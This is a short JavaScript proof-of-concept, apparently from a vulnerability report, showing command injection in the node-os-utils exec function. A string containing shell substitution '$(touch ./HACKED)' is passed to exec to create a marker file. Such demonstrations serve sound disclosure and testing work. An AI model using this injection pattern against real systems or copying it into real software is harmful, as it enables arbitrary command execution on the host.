done = function done(){
    console.log("Done!");
};

var DUMMY_FILE = './HACKED';

var command = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
command += val;
}

dummySource(' ');

var nodeosutils = require('node-os-utils')
var exec = nodeosutils.exec;
exec(command)();
